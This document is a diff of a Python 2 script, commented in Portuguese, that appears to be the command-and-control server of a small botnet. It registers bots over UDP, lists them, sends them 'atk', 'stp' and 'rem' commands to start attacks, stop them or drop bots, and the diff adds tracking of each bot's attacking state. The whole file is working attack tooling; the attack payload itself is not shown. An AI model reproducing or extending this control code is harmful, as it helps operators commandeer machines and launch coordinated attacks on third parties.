@@ -11,6 +11,14 @@ vc tera algo assim:
 
 Mate o processo malvado
 	tskill 19088
+
+Estrutura do bot[i]:
+('Nome_na_rede', ('End.IP.Na.Rede', porta), Atacando)
+bot[i][0] = 'Nome_na_rede'
+bot[i][1] = ('End.IP.Na.Rede', porta)
+    bot[i][1][0] = 'End.IP.Na.Rede'
+    bot[i][1][1] = porta
+bot[i][2] = Atacando 
 """
 import threading
 import errno
@@ -26,8 +34,14 @@ bots = []
 
 def ImprimeBots():
     for i in range(len(bots)):
-        try:#                      Nome                             IP                                      Porta
-            print str(i) + ' - ' + bots[i][0] + "  |  IP: " + str(bots[i][1][0]) + "  |  Porta: " + str(bots[i][1][1])
+        try:
+            if bots[i][2] == True:
+                #                      Nome                             IP                                      Porta
+                print str(i) + ' - ' + bots[i][0] + "  |  IP: " + str(bots[i][1][0]) + "  |  Porta: " + str(bots[i][1][1]) + ' | Atacando'
+            else:
+                #                      Nome                             IP                                      Porta
+                print str(i) + ' - ' + bots[i][0] + "  |  IP: " + str(bots[i][1][0]) + "  |  Porta: " + str(bots[i][1][1]) + ' | Aguardando'
+
         except error, e:
             print 'IP do bot nao encontrado\n'
 
@@ -60,12 +74,13 @@ def ThreadEnvio():
         except EOFError:
             for i in range(len(bots)):
                 EnviaMensagem(i, 'rem')
-            print 'Removento todos os bots\n'
+            print 'Removento todos os bots'
+            print 'Saindo...'
             del bots[:]
             exit(0)
 
         if len(bots) == 0:
-            print 'Nao ha bots conectados'
+            print 'Nao ha bots conectados\n'
 
         else:
             print 'O que deseja fazer?'
@@ -82,53 +97,77 @@ def ThreadEnvio():
                 ImprimeBots()
                 
             elif op == 2:
+                print '\nIniciando ataque em todos os bots'
                 for i in range(len(bots)):
-                    if EnviaMensagem(i, 'atk') == 0:
-                        print 'Bot ' + bots[i][0]  + ' iniciou o ataque\n'
+                    if bots[i][2] == True:
+                        print 'Bot ' + bots[i][0]  + ' ja estava atacando'
                     else:
-                        print 'Bot desconectado ' + bots[i][0] + ', removendo-o da botnet'
-                        bots.remove(bots[i])
-                        i = i - 1
+                        if EnviaMensagem(i, 'atk') == 0:
+                            print 'Bot ' + bots[i][0]  + ' iniciou o ataque'
+                            bots[i] = (bots[i][0], bots[i][1], True) #Atribui True ao estado "Atacando" do bot
+                        else:
+                            print 'Bot desconectado ' + bots[i][0] + ', removendo-o da botnet'
+                            bots.remove(bots[i])
+                            i = i - 1
                     
             elif op == 3:
                 print '\nQual bot deseja que inicie o ataque:'
                 ImprimeBots()
-                bot = input('')
-                if EnviaMensagem(bot, 'atk') == 0:
-                    print 'Bot ' + bots[bot][0] + ' iniciou o ataque\n'
+                i = input('')
+                if bots[i][2] == True:
+                    print 'Bot ' + bots[i][0]  + ' ja esta atacando'
                 else:
-                   print 'Bot desconectado ' + bots[bot][0] + ', removendo-o da botnet'
-                   bots.pop(bot)
+                    if EnviaMensagem(i, 'atk') == 0:
+                        print 'Bot ' + bots[i][0] + ' iniciou o ataque'
+                        bots[i] = (bots[i][0], bots[i][1], True) #Atribui True ao estado "Atacando" do bot
+                    else:
+                       print 'Bot desconectado ' + bots[i][0] + ', removendo-o da botnet'
+                       bots.pop(i)
+                print '\n'
 
             elif op == 4:
-                print 'Parando todos os ataques'
+                print '\nParando todos os ataques'
                 for i in range(len(bots)):
-                    if EnviaMensagem(i, 'stp') == 0:
-                        print 'Bot ' + bots[i][0]  + ' parou o ataque\n'
+                    if bots[i][2] == False:
+                        print 'Bot ' + bots[i][0]  + ' nao estava atacando'
                     else:
-                        print 'Bot desconectado ' + bots[i][0] + ', removendo-o da botnet'
-                        bots.remove(bots[i])
-                        i = i - 1
+                        if EnviaMensagem(i, 'stp') == 0:
+                            print 'Bot ' + bots[i][0]  + ' parou o ataque'
+                            bots[i] = (bots[i][0], bots[i][1], False) #Atribui False ao estado "Atacando" do bot
+                        else:
+                            print 'Bot desconectado ' + bots[i][0] + ', removendo-o da botnet'
+                            bots.remove(bots[i])
+                            i = i - 1
 
             elif op == 5:
                 print '\nQual bot deseja remover da botnet:'
                 ImprimeBots()
-                bot = input('')
-                EnviaMensagem(bot, 'rem')
-                print 'Removendo bot: ' + bots[bot][0] + '\n'
-                bots.remove(bots[bot])
+                i = input('')
+                if bots[i][2] == True:
+                    EnviaMensagem(i, 'stp')
+                EnviaMensagem(i, 'rem')
+                print 'Removendo bot: ' + bots[i][0]
+                bots.remove(bots[i])
+                print '\n'
 
             elif op == 6:
                 for i in range(len(bots)):
+                    if bots[i][2] == True:
+                        EnviaMensagem(i, 'stp')
                     EnviaMensagem(i, 'rem')
-                print 'Removento todos os bots\n'
+                print '\nRemovento todos os bots'
                 del bots[:]
+                print '\n'
 
             elif op == 0:
                 for i in range(len(bots)):
+                    if bots[i][2] == True:
+                        EnviaMensagem(i, 'stp')
                     EnviaMensagem(i, 'rem')
-                print 'Removento todos os bots\n'
+                print '\nRemovento todos os bots'
+                print 'Saindo...'
                 del bots[:]
+                print '\n'
                 exit(0)
 
 try:              
@@ -147,14 +186,14 @@ try:
         if tipo == 'cli' :
             if (message in bots) == False:
                 bots.append((message, clientAddress, False))
-                print '\n' + message + ' conectado a botnet\n'
+                print '\n' + message + ' conectado a botnet'
                 serverSocket.sendto('acc', clientAddress)
 
         if tipo == 'off' :
-            bot = FindByName(message)
-            if bot  != -1:
-                bots.pop(bot)
-                print '\n' + message +  ' desconectado da botnet\n'
+            i = FindByName(message)
+            if i  != -1:
+                bots.pop(i)
+                print '\n' + message +  ' desconectado da botnet'
         #serverSocket.sendto(modifiedMessage, clientAddress)
 except SystemExit:
     for i in range(len(bots)):
